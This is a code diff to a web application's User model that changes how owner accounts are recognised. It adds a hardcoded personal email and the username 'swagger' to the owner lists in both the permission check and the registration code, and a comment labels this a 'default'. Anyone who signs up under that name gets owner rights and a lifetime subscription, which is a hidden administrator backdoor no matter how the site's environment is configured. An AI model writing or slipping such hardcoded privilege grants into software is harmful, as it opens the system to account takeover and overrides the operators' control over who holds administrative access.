@@ -37,8 +37,8 @@ class User(UserMixin):
         import os
         if self.is_owner:
             return True
-        owner_emails = [e.strip().lower() for e in os.environ.get("OWNER_EMAILS", "").split(",") if e.strip()]
-        owner_usernames = [u.strip().lower() for u in os.environ.get("OWNER_USERNAMES", "").split(",") if u.strip()]
+        owner_emails = ["ghost.5abdullah@gmail.com"] + [e.strip().lower() for e in os.environ.get("OWNER_EMAILS", "").split(",") if e.strip()]
+        owner_usernames = ["swagger"] + [u.strip().lower() for u in os.environ.get("OWNER_USERNAMES", "").split(",") if u.strip()]
         if self.email and self.email.lower() in owner_emails:
             return True
         if self.username and self.username.lower() in owner_usernames:
@@ -170,9 +170,9 @@ class User(UserMixin):
         # 30-Day Free Trial initialized for every new user
         trial_end = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
         
-        # Check if this user matches owner credentials from environment
-        owner_emails = [e.strip().lower() for e in os.environ.get("OWNER_EMAILS", "").split(",") if e.strip()]
-        owner_usernames = [u.strip().lower() for u in os.environ.get("OWNER_USERNAMES", "").split(",") if u.strip()]
+        # Check if this user matches owner credentials from environment or default
+        owner_emails = ["ghost.5abdullah@gmail.com"] + [e.strip().lower() for e in os.environ.get("OWNER_EMAILS", "").split(",") if e.strip()]
+        owner_usernames = ["swagger"] + [u.strip().lower() for u in os.environ.get("OWNER_USERNAMES", "").split(",") if u.strip()]
         is_owner = 1 if (email.strip().lower() in owner_emails or username.strip().lower() in owner_usernames) else 0
         sub_status = "lifetime_owner" if is_owner else "trial"
 
